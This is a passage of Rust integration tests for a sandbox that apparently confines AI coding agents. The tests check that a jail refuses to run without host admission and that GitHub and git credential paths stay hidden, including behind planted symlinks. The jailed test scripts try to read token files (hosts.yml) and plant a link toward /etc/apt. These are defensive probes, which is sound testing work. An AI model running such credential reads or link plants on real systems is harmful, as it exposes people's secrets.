    let stderr = stderr_to_end(&mut child);
    let status = child.wait().unwrap();
    let stderr = stderr
        .recv_timeout(std::time::Duration::from_secs(30))
        .expect("every process of the jail ended");
    assert_eq!(status.code(), Some(2), "{stderr}");
    assert!(
        stderr.contains(
            "innerwarden contain: Active Defence on this host did not admit this jail, and its \
             profile starts it only when admitted."
        ),
        "{stderr}"
    );
    assert!(
        stderr.contains(&format!(
            "innerwarden contain: Check that Active Defence is running (systemctl status \
             innerwarden-agent), then try again. The jail waits for it because of start = \
             \"only_when_admitted\" in {}.",
            home.path()
                .join(".config/innerwarden/agent-profiles.toml")
                .display()
        )),
        "{stderr}"
    );
    assert!(
        !stderr.contains("holds no record that the host admitted it"),
        "the jail's first process was ended before it read its record: {stderr}"
    );
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(!marker.exists(), "the command ran: {stderr}");
    assert!(
        processes_naming(&marker).is_empty(),
        "a process of the jail is left: {:?}",
        processes_naming(&marker)
    );
    let dir = home.path().join(".local/state/innerwarden/instances");
    let records: Vec<_> = std::fs::read_dir(&dir)
        .map(|entries| entries.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    assert!(
        records.is_empty(),
        "no record of an instance that never ran: {records:?}"
    );
}

/// SEC-4: a launcher that dies while it waits for the host's answer (killed,
/// a Ctrl-C, the OOM killer) leaves its jail an empty record, and the jail
/// does not start its command: the gate refuses it.
///
/// The host here is a listener that takes the request and never answers;
/// the launcher is SIGKILLed the moment the request arrives, after bwrap
/// reported the jail's first process and before the launcher decided.
///
/// FAILS ON REVERT: hand the jail its command without the gate (drop
/// `gate_instance` in `build_linux_jail`, as before this fix) and the
/// command runs once the launcher is gone.
#[cfg(target_os = "linux")]
#[test]
fn a_launcher_that_dies_before_the_host_answers_starts_nothing() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_starts_only_once_admitted();
    let project = tempfile::TempDir::new().unwrap();
    let marker = project.path().join("COMMAND-RAN");
    let script = format!("touch '{}'", marker.display());
    // Active Defence is "installed" (its ctl is found), and its agent is a
    // listener that takes the request and answers nothing.
    let ad = tempfile::TempDir::new().unwrap();
    let ctl = ad.path().join("innerwarden-ctl");
    std::fs::write(&ctl, "#!/bin/sh\nexit 0\n").unwrap();
    std::fs::set_permissions(&ctl, std::fs::Permissions::from_mode(0o755)).unwrap();
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());

    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped());
    let mut child = identified_without_a_scope(&mut command)
        .env("IW_AD_CLI_DIRS", ad.path())
        .env("INNERWARDEN_AGENT_URL", &url)
        .spawn()
        .expect("run Linux AI Jail with --identity");
    let stderr = stderr_to_end(&mut child);
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    let held = loop {
        match listener.accept() {
            Ok((stream, _)) => break stream,
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                if std::time::Instant::now() > deadline || child.try_wait().unwrap().is_some() {
                    let _ = child.kill();
                    panic!(
                        "the launcher never asked the host: {}",
                        stderr
                            .recv_timeout(std::time::Duration::from_secs(5))
                            .unwrap_or_default()
                    );
                }
                std::thread::sleep(std::time::Duration::from_millis(20));
            }
            Err(e) => panic!("accept: {e}"),
        }
    };
    child.kill().expect("SIGKILL the launcher");
    child.wait().unwrap();
    let stderr = stderr
        .recv_timeout(std::time::Duration::from_secs(30))
        .expect("every process of the jail ended");
    drop(held);
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(
        !marker.exists(),
        "the command ran without an admission: {stderr}"
    );
    assert!(
        stderr.contains("innerwarden contain: this jail holds no record that the host admitted it"),
        "the gate refused it: {stderr}"
    );
    assert!(
        processes_naming(&marker).is_empty(),
        "a process of the jail is left: {:?}",
        processes_naming(&marker)
    );
}

/// A home whose own profile hides `paths` in the claude-code jail.
#[cfg(target_os = "linux")]
fn home_that_hides(paths: &[&str]) -> tempfile::TempDir {
    use std::os::unix::fs::PermissionsExt;
    let home = state_home();
    let dir = home.path().join(".config/innerwarden");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("agent-profiles.toml");
    let list = paths
        .iter()
        .map(|path| format!("\"{path}\""))
        .collect::<Vec<_>>()
        .join(", ");
    std::fs::write(
        &file,
        format!("schema_version = 2\n[profile.claude-code.jail]\nhide_home = [{list}]\n"),
    )
    .unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    home
}

/// brk-1: a hidden home path that is a link (a dotfiles manager's
/// `~/.config/gh -> ../dotfiles/gh`) does not stop the jail: bwrap is never
/// asked to mount on a link, and the token stays out of reach. A link to a
/// folder the jail shows (`~/.config/gh3 -> ~/.local/share/gh3`) is covered
/// where it leads.
///
/// FAILS ON REVERT: mount the path as named (`plan_hidden_home` before this
/// fix) and bwrap aborts: "Can't mount tmpfs on .../.config/gh".
#[cfg(target_os = "linux")]
#[test]
fn a_hidden_home_path_behind_a_link_hides_what_it_leads_to() {
    require_bwrap();
    let home = home_that_hides(&[".config/gh", ".config/gh3"]);
    let h = home.path();
    std::fs::create_dir_all(h.join("dotfiles/gh")).unwrap();
    std::fs::write(h.join("dotfiles/gh/hosts.yml"), "TOKEN-GH").unwrap();
    std::os::unix::fs::symlink("../dotfiles/gh", h.join(".config/gh")).unwrap();
    std::fs::create_dir_all(h.join(".local/share/gh3")).unwrap();
    std::fs::write(h.join(".local/share/gh3/hosts.yml"), "TOKEN-GH3").unwrap();
    std::os::unix::fs::symlink(h.join(".local/share/gh3"), h.join(".config/gh3")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = format!(
        "cat '{0}/.config/gh/hosts.yml' '{0}/.config/gh3/hosts.yml' \
         '{0}/.local/share/gh3/hosts.yml' 2>/dev/null; echo DONE",
        h.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h);
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "the jail did not start: {stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("TOKEN"),
        "a hidden token was read: {stdout}"
    );
}

/// F3: a hidden home path that is not there when the jail starts
/// (`.cache/git/credential` on an account that never used git's credential
/// cache) is made, empty and 0700, before the jail starts, and covered; what
/// a host program makes there while the jail runs stays out of it.
///
/// FAILS ON REVERT: skip `make_hidden_folder` and the file the host makes
/// during the run is listed inside the jail.
#[cfg(target_os = "linux")]
#[test]
fn a_hidden_home_path_made_after_the_jail_started_stays_hidden() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_hides(&[".cache/git/credential"]);
    let h = home.path();
    std::fs::create_dir_all(h.join(".cache")).unwrap();
    let credential = h.join(".cache/git/credential");
    assert!(!credential.exists());
    let project = tempfile::TempDir::new().unwrap();
    let ready = project.path().join("READY");
    let script = format!(
        "touch '{}'; i=0; while [ $i -lt 50 ] && [ ! -e '{}/GO' ]; do sleep 0.1; i=$((i+1)); done; \
         ls -A '{}'; echo DONE",
        ready.display(),
        project.path().display(),
        credential.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let child = identified_without_a_scope(&mut command)
        .spawn()
        .expect("run Linux AI Jail with --identity");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    while !ready.exists() && std::time::Instant::now() < deadline {
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    // The host's git makes its socket in the folder while the jail runs.
    std::fs::create_dir_all(&credential).unwrap();
    std::fs::write(credential.join("socket"), "").unwrap();
    std::fs::write(project.path().join("GO"), "").unwrap();
    let output = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("socket"),
        "the host's socket is in the jail: {stdout}"
    );
    let mode = std::fs::metadata(&credential).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o700, "made as git wants it");
}

/// A person's own home folder that the jail writes is a link to a folder
/// outside the home (`~/.cache` on another disk): a hidden path below it is
/// made (empty, 0700) and hidden where the folder leads, as the jail binds
/// it, and the jail starts. Measured before this: the launch stopped with
/// "outside the home", having first made the folders through the link.
///
/// FAILS ON REVERT: take only the home for the jail's home in
/// `plan_hidden_home` and the launch stops "outside the home".
#[cfg(target_os = "linux")]
#[test]
fn a_home_folder_linked_outside_the_home_hides_where_it_leads() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_hides(&[".cache/git/credential", ".cache/gh"]);
    let h = home.path();
    let elsewhere = tempfile::TempDir::new().unwrap();
    let cache = elsewhere.path().join("cache");
    std::fs::create_dir_all(cache.join("gh")).unwrap();
    std::fs::write(cache.join("gh/hosts.yml"), "TOKEN-GH").unwrap();
    std::os::unix::fs::symlink(&cache, h.join(".cache")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = format!(
        "cat '{0}/.cache/gh/hosts.yml' 2>/dev/null; ls -A '{0}/.cache/git/credential'; echo DONE",
        h.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h);
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "the jail did not start: {stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("TOKEN"),
        "a hidden token was read: {stdout}"
    );
    let made = cache.join("git/credential");
    let mode = std::fs::metadata(&made).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o700, "made where the folder leads, as git wants it");
    assert!(
        std::fs::symlink_metadata(h.join(".cache"))
            .unwrap()
            .file_type()
            .is_symlink(),
        "the person's link is left as it was"
    );
}

/// F2: a link planted where a hidden home path will be (the agent can write
/// `~/.cache`) never moves the mask: one that leads to the project, or
/// outside the home, stops the launch before anything runs.
///
/// FAILS ON REVERT (measured): drop the home check in `plan_hidden_home`
/// and the launch goes on with the link to `/etc/apt`; drop the check of
/// what the jail needs in `validate_jail_inputs` and the jail starts with
/// its project under an empty mount.
#[cfg(target_os = "linux")]
#[test]
fn a_planted_link_never_moves_a_hidden_home_path() {
    require_bwrap();
    for target in ["project", "/etc/apt"] {
        let home = home_that_hides(&[".cache/git/credential"]);
        let h = home.path();
        let project = tempfile::TempDir::new_in(h).unwrap();
        std::fs::write(project.path().join("main.rs"), "fn main() {}").unwrap();
        std::fs::create_dir_all(h.join(".cache/git")).unwrap();
        let to = if target == "project" {
            project.path().to_path_buf()
        } else {
            std::path::PathBuf::from(target)
        };
        std::os::unix::fs::symlink(&to, h.join(".cache/git/credential")).unwrap();
        let marker = project.path().join("COMMAND-RAN");
        let script = format!("touch '{}'", marker.display());
        let mut command = cli();
        command
            .args([
                "contain",
                "--identity",
                "--project",
                project.path().to_str().unwrap(),
                "--",
                "/bin/sh",
                "-c",
                &script,
            ])
            .env("HOME", h);
        let output = identified_without_a_scope(&mut command)
            .output()
            .expect("run Linux AI Jail with --identity");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert_eq!(output.status.code(), Some(2), "{target}: {stderr}");
        assert!(
            stderr.contains("holds the project") || stderr.contains("outside the home"),
            "{target}: {stderr}"
        );
        assert!(!marker.exists(), "{target}: the command ran");
    }
}
